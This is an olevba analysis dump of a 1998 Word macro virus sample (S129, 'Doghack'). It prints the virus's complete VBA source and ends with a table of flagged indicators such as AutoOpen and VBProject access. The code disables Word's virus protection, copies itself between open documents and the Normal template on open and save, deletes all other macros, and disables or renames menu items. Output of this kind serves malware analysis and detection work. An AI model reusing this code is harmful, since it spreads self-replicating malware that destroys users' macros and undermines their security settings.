olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Doghack
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Doghack - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO S129.bas 
in file: Virus.MSWord.Doghack - OLE stream: 'Macros/VBA/S129'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Assalamu'alaikum Wr. Wb.......
' Surabaya, Rabu, 22 Juli 1998
' Virus Macro program by S129 Good DocHacker
' ------------------------- Indonesia ------
' Mohon ma'af bila telah mengganggu Anda.
' Program ini tidak merusak sistem atau file anda.
' Isi virus ini hanya sekedar informasi omong kosong belaka....
' ------------------------- Suroboyo-an -----
' Sepurane lek iki wis ngganggu sampeyan
' Program iki gak ngrusak sistem utawa file sampeyan
' Isine virus iki mek sekedar informasi nggacor thok.....
' -------------------------------------------
Public NormInfected As Boolean
Public DocInfected As Boolean
Public wisGanti As Boolean
Public docSave As Boolean
Sub Dok2Nor()
    Options.VirusProtection = False
    idx = 0
    On Error GoTo Erw1
    NormInfected = False
    Set AD = ActiveDocument
    Set NT = NormalTemplate
    On Error GoTo Erh1a
    jumM = NT.VBProject.VBComponents.Count
    If jumM > 1 Then
    For i = 1 To jumM
      NMacr = NT.VBProject.VBComponents(1 + idx).Name
      If NMacr = "S129" Then NormInfected = True
      If (NMacr <> "S129") And (NMacr <> "S129Form") And (NMacr <> "ThisDocument") Then
        Application.OrganizerDelete Source:=NT.FullName, Name:=NMacr, _
        Object:=wdOrganizerObjectProjectItems
      Else
        idx = idx + 1
      End If
    Next i
    End If
Erh1a:
    If NormInfected = False Then
      On Error GoTo Erh1
      Application.OrganizerCopy Source:=AD.FullName, _
          Destination:=NT.FullName, Name:= _
          "S129", Object:=wdOrganizerObjectProjectItems
      Application.OrganizerCopy Source:=AD.FullName, _
          Destination:=NT.FullName, Name:= _
          "S129Form", Object:=wdOrganizerObjectProjectItems
      Templates(NT.FullName).Save
Erh1:
    End If
Erw1:
End Sub
Sub Nor2Dok()
    On Error GoTo Erw2
    DocInfected = False
    docSave = False
    idx = 0
    Set AD = ActiveDocument
    Set NT = NormalTemplate
    On Error GoTo Erh2a
    jumM = AD.VBProject.VBComponents.Count
    If jumM > 1 Then
    For i = 1 To jumM
      NMacr = AD.VBProject.VBComponents(1 + idx).Name
      If NMacr = "S129" Then DocInfected = True
      If (NMacr <> "S129") And (NMacr <> "S129Form") _
      And (NMacr <> "ThisDocument") Then 'And (nmacr <> "Reference to Normal") Then
        Application.OrganizerDelete Source:=AD.FullName, Name:=NMacr, _
        Object:=wdOrganizerObjectProjectItems
      Else
        idx = idx + 1
      End If
    Next i
    End If
Erh2a:
    If DocInfected = False Then
      On Error GoTo Erh2
      Application.OrganizerCopy Source:=NT.FullName, _
          Destination:=AD.FullName, Name:= _
          "S129", Object:=wdOrganizerObjectProjectItems
      Application.OrganizerCopy Source:=NT.FullName, _
          Destination:=AD.FullName, Name:= _
          "S129Form", Object:=wdOrganizerObjectProjectItems
      docSave = True
Erh2:
    End If
Erw2:
End Sub
Sub AutoOpen()
    wisGanti = False
    NormInfected = False
    WordBasic.DisableAutoMacros 0
    On Error Resume Next
    If (wisGanti = False) And (NormInfected = False) Then
      CommandBars("Help").Controls("About Microsoft Word").Caption = ("Assalamu'alaikum Wr. Wb.....")
      CommandBars("Tools").Controls("Macro").Visible = True
      CommandBars("Tools").Controls("Macro").Enabled = False
      CommandBars("Tools").Controls("Templates and Add-ins...").Enabled = False
      CommandBars("Tools").Controls("Macro").Caption = ("Makmu, Cok.....!!!!")
      CommandBars("Tools").Controls("Templates and Add-ins...").Caption = ("Tempe dan Tahu Enak...!!!")
    End If
    wisGanti = True
    Call Dok2Nor
    WordBasic.DisableAutoMacros 1
End Sub
Sub FileOpen()
    WordBasic.DisableAutoMacros 1
    Dialogs(wdDialogFileOpen).Show
    Call Nor2Dok
    If docSave Then ActiveDocument.SaveAs FileName:=ActiveDocument.Name, fileformat:=wdFormatDocument
    WordBasic.DisableAutoMacros 1
End Sub
Sub FileSaveAs()
    Call Nor2Dok
    Dialogs(wdDialogFileSaveAs).Show
End Sub
Sub FileSave()
    Call Nor2Dok
    If ActiveDocument.Name = ("Doc*.doc") Then
      Dialogs(wdDialogFileSaveAs).Show
    ElseIf ActiveDocument.Saved = False Then
      ActiveDocument.Save
    End If
End Sub
Sub HelpAbout()
    On Error GoTo Erw3
    S129Form.Show
Erw3:
    If (WeekDay(Date) = 4) Then
      s = MsgBox("Seluruh macro pada dokumen aktif / global template kecuali" + _
      " macro ini telah terhapus. Jika macro tersebut penting bagi anda" + _
      ", saya mohon ma'af karena saya tidak bermaksud untuk merusak...", vbInformation, "From me...")
    End If
End Sub
Sub FileExit()
    On Error GoTo Erw4
    If (WeekDay(Date) = 4) Then S129Form.Show
Erw4:
    If (WeekDay(Date) = 4) Then
      s = MsgBox("Seluruh macro pada dokumen aktif / global template kecuali" + _
      " macro ini telah terhapus. Jika macro tersebut penting bagi anda" + _
      ", saya mohon ma'af karena saya tidak bermaksud untuk merusak...", vbInformation, "From me...")
    End If
    WordBasic.FileExit
End Sub

'Sub coba()
'  Dim nmacr(5) As String
'  Set AD = ActiveDocument
'  Set NT = NormalTemplate
'  s = MsgBox("Nama Document :" + AD.Name, vbInformation, "From me...")
'  jumM = AD.VBProject.VBComponents.Count
'  If jumM > 1 Then
'    For i = 1 To jumM
'      nmacr(i) = AD.VBProject.VBComponents(i).Name
'      s = MsgBox("Jumlah macro: " + Str(jumM) + ", " + "macro ke-" + Str(i) + ": " + nmacr(i), vbInformation, "From me...")
'    Next i
'  End If
'End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

